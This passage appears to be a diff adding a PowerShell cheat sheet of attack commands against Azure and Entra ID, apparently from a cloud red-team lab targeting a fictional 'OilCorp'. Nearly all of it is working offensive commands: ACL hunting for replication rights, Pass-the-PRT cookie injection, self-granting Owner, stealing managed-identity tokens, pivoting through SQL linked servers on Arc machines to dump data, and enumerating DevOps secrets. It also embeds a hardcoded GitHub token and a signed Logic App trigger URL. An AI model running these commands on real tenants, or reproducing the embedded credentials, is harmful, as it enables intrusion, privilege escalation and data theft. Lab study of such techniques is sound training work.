+    -Name              ASyaivrkblez3343584 `
+    -ResourceGroupName AS-oyglsntcfh3343536
+
+# Execute Logic App via callback URL
+Invoke-RestMethod `
+    -Method          GET `
+    -UseBasicParsing `
+    -Uri             'https://prod-54.southeastasia.logic.azure.com:443/workflows/e0dc8e964e5a4556a347d4fceef1417e/triggers/manual/paths/invoke?api-version=2018-07-01-preview&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=_YiemEHZwmmdThIlXH_JLX-8-ubyxWEK0DqvV0NRENM'
+
+# ============================================================
+# ON-PREMISES AD (HYBRID)
+# ============================================================
+
+# NOTE: Password must NOT contain '!'
+# Add host file entries for DC and domain before running:
+#   172.16.30.1 reservoirone.corp
+#   172.16.30.1 reservoirone-dc.reservoirone.corp
+
+runas /netonly /user:reservoirone.corp\hybriduser1 cmd
+C:\AzAD\Tools\InviShell\RunWithPathAsAdmin.bat
+
+. C:\AzAD\Tools\PowerView.ps1
+Get-DomainComputer `
+    -DomainController reservoirone-dc.reservoirone.corp `
+    -Domain           reservoirone.corp
+
+# Get all ACLs for domain, resolve SIDs to names
+Get-DomainObjectAcl `
+    -SearchBase        "DC=reservoirone,DC=corp" `
+    -SearchScope       Base `
+    -ResolveGUIDs `
+    -DomainController  reservoirone-dc.reservoirone.corp `
+    -Domain            reservoirone.corp |
+    Where-Object {
+        ($_.ObjectAceType -match 'replication-get') -or
+        ($_.ActiveDirectoryRights -match 'GenericAll')
+    } | ForEach-Object {
+        $_ | Add-Member NoteProperty 'IdentityName' $(
+            Convert-SidToName $_.SecurityIdentifier `
+                -DomainController reservoirone-dc.reservoirone.corp `
+                -Domain reservoirone.corp
+        )
+        $_
+    }
+
+# ============================================================
+# GITHUB
+# ============================================================
+
+$accessToken = "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"
+$headers = @{
+    "Authorization" = "Bearer $accessToken"
+    "Content-Type"  = "application/json"
+}
+
+# Create an issue
+$body = @{ title = "NewIssueX"; body = "NewIssueX" } | ConvertTo-Json -Depth 4
+Invoke-RestMethod `
+    -Uri    "https://api.github.com/repos/OilCorp/awsautomation/issues" `
+    -Method Post `
+    -Headers $headers `
+    -Body    $body
+
+# Read comments on a specific issue
+(Invoke-RestMethod `
+    -Uri     "https://api.github.com/repos/OilCorp/awsautomation/issues/39/comments" `
+    -Method  Get `
+    -Headers $headers).body
+
+# ============================================================
+# MICROSOFT TEAMS — CHAT ENUMERATION
+# ============================================================
+
+# List all chats
+Get-MgChat | Format-List
+
+# List messages in a chat
+Get-MgChatMessage `
+    -ChatId 19:183cdc4a-05fc-41a9-a293-969f3b0e727c_2851cfd2-29f6-4700-9505-107d81efc6ae@unq.gbl.spaces |
+    Format-List
+
+# Read body of a specific message
+(Get-MgChatMessage `
+    -ChatId          19:183cdc4a-05fc-41a9-a293-969f3b0e727c_2851cfd2-29f6-4700-9505-107d81efc6ae@unq.gbl.spaces `
+    -ChatMessageId   1684154301636).Body.Content
+
+# Find a specific user
+Get-MgUser -All | Where-Object { $_.DisplayName -like "*Carl*" }
+
+# ============================================================
+# AZURE ARC — CONNECTED MACHINE
+# ============================================================
+
+# Check for managed service assignments
+Get-AzManagedServicesAssignment | Format-List *
+
+# Execute command on Arc machine (output takes 10-15 min)
+New-AzConnectedMachineRunCommand `
+    -MachineName       'ff-machine' `
+    -ResourceGroupName 'FFDBMachineRG' `
+    -RunCommandName    'SQLQueryX' `
+    -Location          'East US' `
+    -SourceScript      "whoami"
+
+# Check for SQL Server on Arc machine (potential linked server)
+New-AzConnectedMachineRunCommand `
+    -MachineName       'ff-machine' `
+    -ResourceGroupName 'FFDBMachineRG' `
+    -RunCommandName    'SQLQueryX' `
+    -Location          'East US' `
+    -SourceScript      "net start | Select-String 'SQL'"
+
+# List linked servers on local SQL instance
+New-AzConnectedMachineRunCommand `
+    -MachineName       'ff-machine' `
+    -ResourceGroupName 'FFDBMachineRG' `
+    -RunCommandName    'SQLQueryX' `
+    -Location          'East US' `
+    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers')`""
+
+# Check if EDI linked server has further linked servers
+New-AzConnectedMachineRunCommand `
+    -MachineName       'ff-machine' `
+    -ResourceGroupName 'FFDBMachineRG' `
+    -RunCommandName    'SQLQueryX' `
+    -Location          'East US' `
+    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('Select name from sys.servers') AT [EDI]`""
+
+# Retrieve databases from AZURESQL via EDI linked server
+New-AzConnectedMachineRunCommand `
+    -MachineName       'ff-machine' `
+    -ResourceGroupName 'FFDBMachineRG' `
+    -RunCommandName    'SQLQueryX' `
+    -Location          'East US' `
+    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('sp_catalogs AZURESQL') AT [EDI]`""
+
+# List tables in 'oilcorp_logistics_database'
+New-AzConnectedMachineRunCommand `
+    -MachineName       'ff-machine' `
+    -ResourceGroupName 'FFDBMachineRG' `
+    -RunCommandName    'SQLQueryX' `
+    -Location          'East US' `
+    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('sp_tables_ex @table_server = AZURESQL, @table_catalog = oilcorp_logistics_database') AT [EDI]`""
+
+# Query 'inventory' table from oilcorp_logistics_database
+New-AzConnectedMachineRunCommand `
+    -MachineName       'ff-machine' `
+    -ResourceGroupName 'FFDBMachineRG' `
+    -RunCommandName    'SQLQueryX' `
+    -Location          'East US' `
+    -SourceScript      "sqlcmd -s FF-MACHINE -Q `"EXECUTE ('SELECT * FROM [AZURESQL].[oilcorp_logistics_database].[dbo].[inventory]') AT [EDI]`""
+
+# Get cert thumbprint
+Get-PfxCertificate -FilePath C:\Users\studentuserX\Downloads\Miro_Certificate.pfx
+
+##
+# ============================================================
+# PASS-THE-PRT
+# ============================================================
+
+# Inject PRT cookie into browser session using AADInternals
+Import-Module C:\AzAD\Tools\AADInternals\AADInternals.psd1
+
+# Create a seamless SSO token from PRT
+$PRT = "eyJ0eXAiOiJKV1Qi..."  # PRT token from ROADToken/Mimikatz
+$TenantId = "2d50cb29-5f7b-48a4-87ce-fe75a941adb6"
+
+# Get a PRT cookie to inject into Edge/Chrome
+$PRTCookie = New-AADIntUserPRTToken `
+    -RefreshToken $PRT `
+    -GetNonce
+
+# Use the cookie in browser:
+# Chrome/Edge -> F12 -> Application -> Cookies -> x-ms-RefreshTokenCredential -> paste value
+# Then navigate to https://portal.azure.com
+
+# ============================================================
+# PRIVILEGE ESCALATION — ABUSING AZURE RBAC MISCONFIGURATIONS
+# ============================================================
+
+# Check for Owner/Contributor on subscription
+Get-AzRoleAssignment | Where-Object {
+    $_.RoleDefinitionName -in @('Owner','Contributor') -and
+    $_.Scope -like '*/subscriptions/*'
+}
+
+# Check for User Access Administrator (can grant themselves any role)
+Get-AzRoleAssignment | Where-Object {
+    $_.RoleDefinitionName -eq 'User Access Administrator'
+}
+
+# Assign Owner to self if UAA is held
+New-AzRoleAssignment `
+    -SignInName        attacker@tenant.onmicrosoft.com `
+    -RoleDefinitionName Owner `
+    -Scope             "/subscriptions/<subscription-id>"
+
+# ============================================================
+# PRIVILEGE ESCALATION — ENTRA ID ROLES
+# ============================================================
+
+# Check for privileged Entra ID roles on current user
+Get-MgRoleManagementDirectoryRoleAssignment `
+    -Filter "principalId eq '$($currentUser.Id)'" |
+    ForEach-Object {
+        (Get-MgRoleManagementDirectoryRoleDefinition `
+            -UnifiedRoleDefinitionId $_.RoleDefinitionId).DisplayName
+    }
+
+# Privileged roles to look for:
+# - Global Administrator
+# - Privileged Role Administrator     <- can assign any role
+# - Application Administrator         <- can add creds to any app
+# - Cloud Application Administrator   <- same but no App Proxy
+# - Hybrid Identity Administrator     <- can abuse AAD Connect
+# - Helpdesk Administrator            <- can reset passwords (scoped)
+# - Authentication Administrator      <- can reset MFA/auth methods
+
+# ============================================================
+# CROSS-TENANT ATTACKS
+# ============================================================
+
+# Enumerate tenants accessible via current tokens (guest/B2B)
+Get-AzTenant
+
+# Switch context to another tenant
+Connect-AzAccount -Tenant <target-tenant-id>
+
+# Check for guest user access in foreign tenant
+$Token = (Get-AzAccessToken -ResourceUrl https://graph.microsoft.com -TenantId <target-tenant-id>).Token
+$URI   = 'https://graph.microsoft.com/v1.0/organization'
+$RequestParams = @{
+    Method  = 'GET'
+    Uri     = $URI
+    Headers = @{ 'Authorization' = "Bearer $Token" }
+}
+Invoke-RestMethod @RequestParams
+
+# Enumerate what resources a guest can see in target tenant
+Get-AzResource -TenantId <target-tenant-id>
+Get-AzRoleAssignment -TenantId <target-tenant-id>
+
+# ============================================================
+# MANAGED IDENTITY — PRIVILEGE ESCALATION
+# ============================================================
+
+# From inside an App Service / VM / Function App with MI enabled:
+# Check what the MI can do across all resources
+$Token = (Invoke-RestMethod `
+    -Uri     "$env:IDENTITY_ENDPOINT?resource=https://management.azure.com/&api-version=2017-09-01" `
+    -Headers @{ secret = $env:IDENTITY_HEADER }).access_token
+
+Connect-AzAccount -AccessToken $Token -AccountId <mi-client-id>
+Get-AzRoleAssignment  # see what the MI is assigned to
+Get-AzResource        # see what it can enumerate
+
+# ============================================================
+# AZURE DEVOPS RECON (if encountered)
+# ============================================================
+
+$ADOOrg   = "OilCorp"
+$ADOToken = "..."  # PAT or Bearer token
+
+$headers = @{ Authorization = "Bearer $ADOToken" }
+
+# List projects
+Invoke-RestMethod `
+    -Uri     "https://dev.azure.com/$ADOOrg/_apis/projects?api-version=7.1" `
+    -Headers $headers
+
+# List pipelines in a project
+Invoke-RestMethod `
+    -Uri     "https://dev.azure.com/$ADOOrg/OilCorpProject/_apis/pipelines?api-version=7.1" `
+    -Headers $headers
+
+# List variable groups (may contain secrets)
+Invoke-RestMethod `
+    -Uri     "https://dev.azure.com/$ADOOrg/OilCorpProject/_apis/distributedtask/variablegroups?api-version=7.1" `
+    -Headers $headers
+
+# List service connections (may contain SP creds/certs)
+Invoke-RestMethod `
+    -Uri     "https://dev.azure.com/$ADOOrg/OilCorpProject/_apis/serviceendpoint/endpoints?api-version=7.1" `
+    -Headers $headers
+# ============================================================
